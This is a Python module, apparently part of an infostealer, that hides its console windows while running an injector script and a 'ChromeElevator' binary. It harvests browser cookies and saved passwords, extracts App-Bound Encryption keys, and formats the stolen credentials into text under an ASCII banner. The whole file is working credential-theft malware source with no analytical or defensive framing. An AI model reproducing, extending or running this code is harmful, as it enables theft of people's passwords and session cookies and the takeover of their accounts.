# modules/browser_stealer.py - Cookies from injector.py, Passwords from chromelevator

import os
import subprocess
import json
import shutil
from pathlib import Path
from config import LOCAL, log

CHROMELEVATOR_PATH = "chromelevator_x64.exe"
INJECTOR_PATH = "injector.py"

REALITY_ASCII = r"""
__________              .__  .__  __          ____   ____________  
\______   \ ____ _____  |  | |__|/  |_ ___.__.\   \ /   /\_____  \ 
 |       _// __ \\__  \ |  | |  \   __<   |  | \   Y   /   _(__  < 
 |    |   \  ___/ / __ \|  |_|  ||  |  \___  |  \     /   /       \
 |____|_  /\___  >____  /____/__||__|  / ____|   \___/   /______  /
        \/     \/     \/               \/                       \/ 
"""

def parse_passwords_to_text(passwords_json_path):
    """Convert ChromeElevator JSON passwords to readable text format"""
    try:
        with open(passwords_json_path, 'r', encoding='utf-8') as f:
            passwords = json.load(f)
        
        if not passwords:
            return None
        
        text_output = REALITY_ASCII + "\n"
        text_output += f"{'='*80}\n"
        text_output += f"PASSWORDS - {len(passwords)} TOTAL\n"
        text_output += f"{'='*80}\n\n"
        
        for pwd in passwords:
            site = pwd.get('url', 'Unknown')
            username = pwd.get('username', '')
            password = pwd.get('password', '')
            
            text_output += f"Site: {site}\n"
            text_output += f"Username: {username}\n"
            text_output += f"Password: {password}\n"
            text_output += f"{'='*80}\n\n"
        
        return text_output
    
    except Exception as e:
        log(f"Failed to convert passwords to text: {e}")
        return None

def grab_cookies_from_injector():
    """Run injector.py and read cookies from /cookies directory"""
    log("Running injector.py for cookies...")
    
    if not os.path.exists(INJECTOR_PATH):
        log(f"Injector not found: {INJECTOR_PATH}")
        return None
    
    try:
        # Run injector.py
        result = subprocess.run(
            ["python", INJECTOR_PATH],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=120
        )
        
        log(f"Injector output: {result.stdout}")
        
        # Check if cookies directory was created
        cookies_dir = Path("cookies")
        if not cookies_dir.exists():
            log("Injector cookies directory not found")
            return None
        
        # Read all cookie files
        cookie_files = {}
        total_cookies = 0
        
        for cookie_file in cookies_dir.glob("*_cookies.txt"):
            browser_name = cookie_file.stem.replace("_cookies", "")
            with open(cookie_file, 'r', encoding='utf-8') as f:
                cookie_content = f.read()
                if cookie_content.strip():
                    cookie_files[browser_name] = cookie_content
                    cookie_count = cookie_content.count('\n')
                    total_cookies += cookie_count
                    log(f"Loaded {cookie_count} cookies from {browser_name}")
        
        log(f"Total cookies extracted: {total_cookies}")
        return cookie_files
    
    except subprocess.TimeoutExpired:
        log("Injector timed out")
        return None
    except Exception as e:
        log(f"Injector failed: {e}")
        return None

def grab_passwords_from_chromelevator():
    """Run chromelevator for passwords only"""
    log("Running ChromeElevator for passwords...")
    
    if not os.path.exists(CHROMELEVATOR_PATH):
        log(f"ChromeElevator not found: {CHROMELEVATOR_PATH}")
        return None
    
    try:
        # Run ChromeElevator for all data (we'll only use passwords)
        result = subprocess.run(
            [CHROMELEVATOR_PATH, "-v", "all"],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=120
        )
        
        verbose_log = result.stdout
        
        # Find output directory
        output_dir = Path("output")
        
        if not output_dir.exists():
            log("ChromeElevator output directory not found")
            return None
        
        log(f"ChromeElevator output: {output_dir}")
        
        # Extract ABE keys
        abe_keys = []
        lines = verbose_log.split('\n')
        for i, line in enumerate(lines):
            if "App-Bound Encryption Key" in line:
                for j in range(i+1, min(i+5, len(lines))):
                    key_line = lines[j].strip()
                    if len(key_line) == 64 and all(c in '0123456789ABCDEFabcdef' for c in key_line):
                        abe_keys.append(key_line)
                        break
        
        if abe_keys:
            log(f"Extracted {len(abe_keys)} ABE keys")
        
        # Convert passwords to text format
        text_passwords = {}
        
        for browser_dir in output_dir.iterdir():
            if not browser_dir.is_dir():
                continue
            
            browser_name = browser_dir.name
            
            for profile_dir in browser_dir.iterdir():
                if not profile_dir.is_dir():
                    continue
                
                profile_name = profile_dir.name
                key = f"{browser_name}/{profile_name}"
                
                # Convert passwords
                passwords_json = profile_dir / 'passwords.json'
                if passwords_json.exists():
                    text_data = parse_passwords_to_text(passwords_json)
                    if text_data:
                        text_passwords[key] = text_data
                        log(f"Converted passwords to text: {key}")
        
        return {
            'output_dir': output_dir,
            'verbose_log': verbose_log,
            'abe_keys': abe_keys,
            'text_passwords': text_passwords
        }
    
    except subprocess.TimeoutExpired:
        log("ChromeElevator timed out")
        return None
    except Exception as e:
        log(f"ChromeElevator failed: {e}")
        return None

def grab():
    """Main browser stealing function - cookies from injector, passwords from chromelevator"""
    log("Starting browser data extraction...")
    
    # Get cookies from injector.py
    cookie_files = grab_cookies_from_injector()
    
    # Get passwords from chromelevator
    chromelevator_data = grab_passwords_from_chromelevator()
    
    if not cookie_files and not chromelevator_data:
        log("Failed to extract any browser data")
        return None
    
    return {
        'cookies': cookie_files or {},
        'passwords': chromelevator_data or {}
    }